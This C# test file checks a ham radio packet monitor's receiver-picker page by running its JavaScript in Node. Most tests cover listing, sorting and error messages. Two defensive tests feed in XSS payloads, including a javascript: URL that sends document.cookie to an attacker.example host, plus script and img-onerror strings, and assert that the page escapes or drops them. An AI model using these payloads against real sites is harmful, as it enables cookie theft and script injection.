using System.Diagnostics;
using System.Net;
using System.Text.Json;
using AwesomeAssertions;
using Microsoft.Extensions.Time.Testing;
using Packet.SoundModem.Daemon;
using Packet.SoundModem.UberSdr;
using Packet.SoundModem.Waterfall;

namespace Packet.SoundModem.Tests.Monitor;

/// <summary>
/// The picker's own JavaScript, run against a real <see cref="MonitorHost"/>.
/// </summary>
/// <remarks>
/// The same argument as <c>WaterfallPageTests</c>: everything server-side can be green while the
/// page shows nothing, and what this page does with a snapshot - which rows it draws, where each
/// one links, and what it says when the directory has gone away - is JavaScript rather than
/// pixels. So the shipping script is executed here, as a browser executes it, by Node. Skipped
/// when Node is not installed rather than failing.
/// </remarks>
public class MonitorPageTests
{
    private const string Title = "UK packet monitor";

    private const string About =
        "The 7050-7052 kHz packet window on 40 m, as heard by public web receivers. "
        + "Pick a receiver to watch. Receive only.";

    [Fact]
    public async Task The_Picker_Page_Lists_Every_Offered_Receiver()
    {
        string node = ResolveNode();
        Assert.SkipWhen(node.Length == 0, "node is not installed; the page cannot be executed");

        await using var host = await Harness.StartAsync();
        Probe probe = await RunProbeAsync(node, host.Port);

        probe.Thrown.Should().BeEmpty("the page must not throw while listing receivers");
        probe.Title.Should().Be(Title, "the tab and the top bar take the configured title");
        probe.Heading.Should().Be(Title);
        probe.About.Should().Contain("Receive only");
        probe.AboutHidden.Should().BeFalse();
        probe.PollMs.Should().Equal([10000], "the picker is a table that changes once a minute");

        // Five columns, and none of them for what a receiver is doing. That is a fact about this
        // site's machinery rather than about the band, and it is not what a visitor came for.
        probe.Headings.Should().Equal(["Station", "Receiver", "Where", "Signal", "Slots"]);

        // Two of the three receivers can be picked, and both are drawn.
        probe.Rows.Should().HaveCount(2);
        probe.RowCells.Should().OnlyContain(
            cells => cells.Length == 5, "a row carries one cell per column and no more");

        string dalgety = probe.Rows.Single(r => r.Contains("M9PSY-1"));
        dalgety.Should().Contain("href=\"/r/m9psy-1/\"", "the row links to that receiver's page")
            .And.Contain("Dalgety Bay, Scotland, UK")
            .And.Contain("RX888 with 40m Full Wave Loop")
            .And.Contain("31 dB", "the receiver's own signal figure")
            .And.Contain("19 of 20", "free slots of total")
            .And.Contain("https://m9psy-1.instance.ubersdr.org/",
                "a link to the receiver's own page: it is somebody else's receiver");

        // Every row is a link, because every row is a receiver that can be picked.
        probe.RowCells.Select(cells => cells[0]).Should().OnlyContain(
            first => first.Contains("<a class=\"pick\" href=\"/r/"),
            "a row a visitor cannot follow has no business being on a page they came here to pick from");

        // None of the words the state column used to put in a row, in any of its cases, and no
        // tint on a row somebody is watching either: the page says nothing about who else is here.
        string table = string.Join("", probe.Rows);
        table.Should().NotContain("free").And.NotContain("watching").And.NotContain("watched")
            .And.NotContain("connecting").And.NotContain("just left")
            .And.NotContain("daily allowance").And.NotContain("not working just now");

        probe.Summary.Should().Contain("2 receivers").And.Contain("1 not available")
            .And.NotContain("watch", "the count across the top no longer says how many are watching");
        probe.StaleHidden.Should().BeTrue("the directory answered");
        probe.EmptyHidden.Should().BeTrue();
        probe.Footer.Should().Contain("Receive only")
            .And.Contain("one session however many people are watching")
            .And.Contain("would rather not be listed",
                "the answer to an operator's request is given before anybody has to ask");

        // No map, no flags, no images: it is a list.
        string.Join("", probe.Rows).Should().NotContain("<img").And.NotContain("<svg");
    }

    [Fact]
    public async Task The_Picker_Page_Leaves_Out_A_Receiver_With_No_Room()
    {
        string node = ResolveNode();
        Assert.SkipWhen(node.Length == 0, "node is not installed; the page cannot be executed");

        await using var host = await Harness.StartAsync();
        Probe probe = await RunProbeAsync(node, host.Port);

        // The API says what it has always said: the receiver is there, it is not on offer, and
        // why. Nothing downstream of it has to guess, and the page is not the only reader.
        using JsonDocument snapshot = JsonDocument.Parse(await host.InstancesAsync());
        JsonElement full = snapshot.RootElement.GetProperty("receivers").EnumerateArray()
            .Single(r => r.GetProperty("callsign").GetString() == "G4EYR");
        full.GetProperty("offered").GetBoolean().Should().BeFalse();
        full.GetProperty("why").GetString().Should().Be("full");

        // The page does not draw it. A visitor can do nothing with a receiver that has no room,
        // and it comes back by itself at the next refresh with a slot going spare.
        probe.Rows.Should().NotContain(r => r.Contains("G4EYR"));

        // The count still admits it exists, so a list that is shorter than the directory's does
        // not read as receivers having quietly disappeared.
        probe.Summary.Should().Contain("2 receivers").And.Contain("1 not available");
    }

    [Fact]
    public async Task The_Picker_Page_Lists_Receivers_In_Callsign_Order()
    {
        string node = ResolveNode();
        Assert.SkipWhen(node.Length == 0, "node is not installed; the page cannot be executed");

        await using var host = await Harness.StartAsync();
        Probe probe = await RunProbeAsync(node, host.Port);

        // By callsign and by nothing else. The directory hands these over in host order, which
        // puts m9psy-1 before reading-ubersdr and so M9PSY-1 before M0LTE; the page does not.
        probe.Rows[0].Should().Contain("M0LTE");
        probe.Rows[1].Should().Contain("M9PSY-1");
    }

    [Fact]
    public async Task The_Picker_Page_Says_When_The_Directory_Is_Unreachable()
    {
        string node = ResolveNode();
        Assert.SkipWhen(node.Length == 0, "node is not installed; the page cannot be executed");

        await using var host = await Harness.StartAsync();
        host.Fail("Connection refused (instances.ubersdr.org:443)");
        await host.RefreshAsync();

        Probe probe = await RunProbeAsync(node, host.Port);

        probe.Thrown.Should().BeEmpty();
        probe.StaleHidden.Should().BeFalse();
        probe.Stale.Should().StartWith("the receiver directory is unreachable, this list is from ")
            .And.MatchRegex(@"\d\d?[:.]\d\d");
        probe.Rows.Should().HaveCount(
            2, "a directory that has gone away leaves the last list it gave, which is still true");
    }

    [Fact]
    public async Task A_Cold_Picker_Page_Says_Why_It_Is_Empty()
    {
        string node = ResolveNode();
        Assert.SkipWhen(node.Length == 0, "node is not installed; the page cannot be executed");

        await using var host = await Harness.StartAsync(coldFailure: "Name or service not known");
        Probe probe = await RunProbeAsync(node, host.Port);

        probe.Thrown.Should().BeEmpty();
        probe.Rows.Should().BeEmpty();
        probe.EmptyHidden.Should().BeFalse();
        probe.Empty.Should().Contain("cannot be reached")
            .And.Contain("Name or service not known")
            .And.Contain("nothing needs doing here",
                "a visitor who can do nothing about it should be told that too");
    }

    [Fact]
    public async Task The_Picker_Page_Never_Renders_A_Link_It_Cannot_Vouch_For()
    {
        string node = ResolveNode();
        Assert.SkipWhen(node.Length == 0, "node is not installed; the page cannot be executed");

        // The page is the thing that actually writes the href, so it checks too - the daemon
        // having already refused this string is the first of two, not the only one. Driven with
        // the daemon's check defeated, by handing the page a snapshot straight from a directory
        // that carries one.
        await using var host = await Harness.StartAsync(
            directoryJson: Harness.DirectoryJson.Replace(
                "\"public_url\": \"https://m9psy-1.instance.ubersdr.org/\"",
                "\"public_url\": \"javascript:fetch('https://attacker.example/'+document.cookie)\""));

        Probe probe = await RunProbeAsync(node, host.Port);

        probe.Thrown.Should().BeEmpty();
        string.Join("", probe.Rows).Should().NotContain("javascript:");

        // The row is still there and still links to the receiver's page, because the daemon put
        // the endpoint's own URL in place of the one it would not carry.
        string dalgety = probe.Rows.Single(r => r.Contains("M9PSY-1"));
        dalgety.Should().Contain("https://m9psy-1.instance.ubersdr.org/");
    }

    private sealed record Probe(
        string Title,
        string Heading,
        string About,
        bool AboutHidden,
        string Summary,
        string Stale,
        bool StaleHidden,
        string Empty,
        bool EmptyHidden,
        string Footer,
        string[] Rows,
        string[][] RowCells,
        string[] Headings,
        int[] PollMs,
        bool Reloaded,
        string[] Thrown);

    [Fact]
    public async Task The_Picker_Lists_A_Station_And_A_Receiver_In_One_List()
    {
        string node = ResolveNode();
        Assert.SkipWhen(node.Length == 0, "node is not installed; the page cannot be executed");

        await using var host = await Harness.StartAsync(uplinks: true);
        await using var station = await StubStation.OpenAsync(host.Port, host.Token, "GB7RDG-2",
            site: "https://gb7rdg.example/");
        await station.WelcomedAsync();
        await UntilRowAsync(host);

        Probe probe = await RunProbeAsync(node, host.Port);

        probe.Thrown.Should().BeEmpty("the page must not throw with two kinds of thing in it");

        // Tom, on how the two should appear: "One list with two categories". So there is one
        // table, in one order, and the category is a word in the first cell rather than a second
        // heading over a second table.
        probe.Headings.Should().Equal(["Station", "Receiver", "Where", "Signal", "Slots"]);
        probe.Rows.Should().HaveCount(3, "two receivers and a station, in one list");
        probe.RowCells.Should().OnlyContain(cells => cells.Length == 5);
        probe.Rows.Count(r => r.Contains("<span class=\"kind\">station</span>")).Should().Be(1);
        probe.Rows.Count(r => r.Contains("<span class=\"kind\">receiver</span>")).Should().Be(2);

        // Sorted by callsign and by nothing else, as before: a station is not lifted to the top
        // for being new, and the order a visitor sees has a reason they can see.
        probe.Rows.Select(r => r.Contains("GB7RDG-2")).Should().Equal([true, false, false],
            "G comes before M0LTE and M9PSY-1");

        string row = probe.Rows.Single(r => r.Contains("GB7RDG-2"));
        row.Should().Contain("href=\"/r/gb7rdg-2/\"", "the row links to that station's page")
            .And.Contain("Tom M0LTE", "whose station it is")
            .And.Contain("Reading, England", "and where")
            .And.Contain("IC-7300 into a doublet", "and what they are listening with")
            .And.Contain("AFSK300", "and the modes it runs")
            .And.Contain("https://gb7rdg.example/", "and a link to their own page");

        // The two figures a station has no honest answer for are blank, not borrowed.
        string[] cells = probe.RowCells[probe.Rows.ToList().FindIndex(r => r.Contains("GB7RDG-2"))];
        cells[3].Should().BeEmpty("a station has no signal figure of a web receiver's kind");
        cells[4].Should().BeEmpty("and no listener slots");

        probe.Summary.Should().Contain("2 receivers").And.Contain("1 station");
        probe.Footer.Should().Contain("somebody's own transceiver")
            .And.Contain("nothing on this site can transmit through one")
            .And.Contain("public record of the callsigns it heard",
                "the site says what it does with what it is sent, before anybody has to ask");
    }

    [Fact]
    public async Task A_Station_String_With_A_Script_Tag_Reaches_The_Page_Escaped()
    {
        string node = ResolveNode();
        Assert.SkipWhen(node.Length == 0, "node is not installed; the page cannot be executed");

        await using var host = await Harness.StartAsync(uplinks: true);

        // A relayed station is a semi-trusted publisher: the site vouches for nothing about it
        // except that the token belongs to that operator, and everything it sends reaches a
        // public page. Same class of input as the third-party directory's strings, and the same
        // two answers - escape every one of them, and let no scheme but http or https write an
        // href. PR #388 found the second of those the hard way.
        await using var station = await StubStation.OpenAsync(
            host.Port, host.Token, "GB7RDG-2",
            op: "<script>alert(1)</script>",
            location: "<img src=x onerror=alert(2)>",
            radio: "\"><b>bold</b>",
            site: "javascript:alert(3)");
        await station.WelcomedAsync();
        await UntilRowAsync(host);

        Probe probe = await RunProbeAsync(node, host.Port);

        probe.Thrown.Should().BeEmpty();
        string row = probe.Rows.Single(r => r.Contains("GB7RDG-2"));
        row.Should().NotContain("<script>").And.NotContain("<img").And.NotContain("<b>")
            .And.NotContain("javascript:", "no scheme but http or https writes an href here");
        row.Should().Contain("&lt;script&gt;alert(1)&lt;/script&gt;")
            .And.Contain("&lt;img src=x onerror=alert(2)&gt;")
            .And.Contain("&quot;&gt;&lt;b&gt;bold&lt;/b&gt;");
        row.Should().NotContain(
            "class=\"own\"", "a station with no usable site URL gets no link at all");
    }

    /// <summary>Waits for the station's row to appear in the API the picker polls.</summary>
    private static async Task UntilRowAsync(Harness host)
    {
        for (int attempt = 0; attempt < 200; attempt++)
        {
            if ((await host.InstancesAsync()).Contains(
                    "\"kind\":\"station\"", StringComparison.Ordinal))
            {
                return;
            }

            await Task.Delay(20);
        }

        Assert.Fail("the station never appeared in /api/instances");
    }

    private static async Task<Probe> RunProbeAsync(string node, int port)
    {
        string here = Path.GetDirectoryName(typeof(MonitorPageTests).Assembly.Location)!;
        var start = new ProcessStartInfo(node)
        {
            ArgumentList = { Path.Combine(here, "Monitor", "browser", "monitor-probe.mjs") },
            RedirectStandardOutput = true,
            RedirectStandardError = true,
        };
        using var pageFile = new PageFile();
        start.Environment["PAGE"] = pageFile.FullName;
        start.Environment["PORT"] = port.ToString();

        using Process probe = Process.Start(start)!;
        string stdout = await probe.StandardOutput.ReadToEndAsync();
        string stderr = await probe.StandardError.ReadToEndAsync();
        await probe.WaitForExitAsync();

        probe.ExitCode.Should().Be(0, $"the probe must run to completion:\n{stderr}");
        return JsonSerializer.Deserialize<Probe>(stdout, JsonSerializerOptions.Web)
               ?? throw new InvalidOperationException($"probe produced no result:\n{stdout}{stderr}");
    }

    /// <summary>
    /// The page the daemon serves is an embedded resource; the probe needs it as a file. Written
    /// out from the assembly rather than read out of the source tree, so what is tested is what
    /// ships, and deleted as soon as it has been used.
    /// </summary>
    private sealed class PageFile : IDisposable
    {
        public PageFile()
        {
            using Stream? resource = typeof(MonitorPage).Assembly
                .GetManifestResourceStream("Packet.SoundModem.Waterfall.wwwroot.monitor.html");
            resource.Should().NotBeNull("the picker ships embedded in the library");

            FullName = Path.Combine(Path.GetTempPath(), $"pdnsm-picker-{Guid.NewGuid():N}.html");
            using FileStream file = File.Create(FullName);
            resource!.CopyTo(file);
        }

        public string FullName { get; }

        public void Dispose() => File.Delete(FullName);
    }

    private static string ResolveNode()
    {
        foreach (string dir in (Environment.GetEnvironmentVariable("PATH") ?? "").Split(':'))
        {
            string candidate = Path.Combine(dir, "node");
            if (File.Exists(candidate))
            {
                return candidate;
            }
        }

        return "";
    }

    /// <summary>A monitor host with three fake receivers and a directory the test can break.</summary>
    private sealed class Harness : IAsyncDisposable
    {
        private readonly MonitorHost _host;
        private readonly HttpClient _http;
        private string? _failure;

        private Harness(int port, string? coldFailure, string directoryJson, bool uplinks)
        {
            _failure = coldFailure;
            _directoryJson = directoryJson;
            Port = port;
            (Token, string hash) = UplinkToken.Mint();
            _host = new MonitorHost(new MonitorHostOptions
            {
                Uplinks = uplinks
                    ?
                    [
                        new UplinkConfig
                        {
                            Callsign = "GB7RDG-2",
                            Slug = "gb7rdg-2",
                            TokenSha256 = hash,
                        },
                    ]
                    : [],
                Directory = new UberSdrDirectoryOptions
                {
                    Url = "https://instances.example.org/api/instances",
                    IqMode = "iq48",
                    WindowLowHz = 7050136,
                    WindowHighHz = 7051776,
                },
                Port = port,
                Bind = "127.0.0.1",
                Modems = [new ModemConfig { SubChannel = 0, Mode = "afsk1200", Frequency = 1700 }],
                DspRate = 12000,
                DialHz = 7049450,
                Title = Title,
                About = About,
                IdBeacons = false,
                TimeProvider = new FakeTimeProvider(),
                Journal = _ => new StationJournal("", _ => { }, _ => { }),
                FetchDirectory = _ => _failure is null
                    ? Task.FromResult(_directoryJson)
                    : Task.FromException<string>(new HttpRequestException(_failure)),
                OpenInput = (receiver, log, token) => throw new InvalidOperationException(
                    "no receiver is picked in these tests"),
            });
            _http = new HttpClient { BaseAddress = new Uri($"http://127.0.0.1:{port}") };
        }

        private readonly string _directoryJson;

        internal int Port { get; }

        /// <summary>The token this site has issued to its one configured station.</summary>
        internal string Token { get; }

        internal static async Task<Harness> StartAsync(
            string? coldFailure = null, string? directoryJson = null, bool uplinks = false)
        {
            var harness = new Harness(
                FreePorts.Next(), coldFailure, directoryJson ?? DirectoryJson, uplinks);
            (await harness._host.StartAsync()).Should().Be(0);
            return harness;
        }

        internal void Fail(string reason) => _failure = reason;

        internal Task RefreshAsync() => _host.RefreshDirectoryAsync();

        /// <summary>What the API says, as against what the page made of it.</summary>
        internal Task<string> InstancesAsync() => _http.GetStringAsync("/api/instances");

        public async ValueTask DisposeAsync()
        {
            _http.Dispose();
            await _host.DisposeAsync();
        }

        /// <summary>Three receivers: two with room, one full.</summary>
        internal const string DirectoryJson = """
            {"count": 3, "instances": [
              {"host": "m9psy-1.instance.ubersdr.org", "port": 443, "tls": true,
               "callsign": "M9PSY-1", "name": "RX888 with 40m Full Wave Loop (GPSDO)",
               "location": "Dalgety Bay, Scotland, UK",
               "public_url": "https://m9psy-1.instance.ubersdr.org/",
               "is_online": true, "available_clients": 19, "max_clients": 20,
               "public_iq_modes": ["iq48"], "antenna_connected": true, "load_status": "ok",
               "snr_0_30_mhz": 31,
               "tuning_range": {"min_frequency": 10000, "max_frequency": 30000000, "reported": true}},
              {"host": "reading-ubersdr.m0lte.uk", "port": 443, "tls": true,
               "callsign": "M0LTE", "name": "SDR with Active Loop",
               "location": "Reading, England, UK",
               "public_url": "https://reading-ubersdr.m0lte.uk/",
               "is_online": true, "available_clients": 20, "max_clients": 20,
               "public_iq_modes": ["iq48"], "antenna_connected": true, "load_status": "ok",
               "snr_0_30_mhz": 21,
               "tuning_range": {"min_frequency": 10000, "max_frequency": 30000000, "reported": true}},
              {"host": "g4eyr.tunnel.ubersdr.org", "port": 443, "tls": true,
               "callsign": "G4EYR", "name": "RSPdx with a dipole",
               "location": "Wiltshire, England, UK",
               "public_url": "https://g4eyr.tunnel.ubersdr.org/",
               "is_online": true, "available_clients": 0, "max_clients": 4,
               "public_iq_modes": ["iq48"], "antenna_connected": true, "load_status": "critical",
               "snr_0_30_mhz": 12,
               "tuning_range": {"min_frequency": 10000, "max_frequency": 30000000, "reported": true}}
            ]}
            """;

    }
}
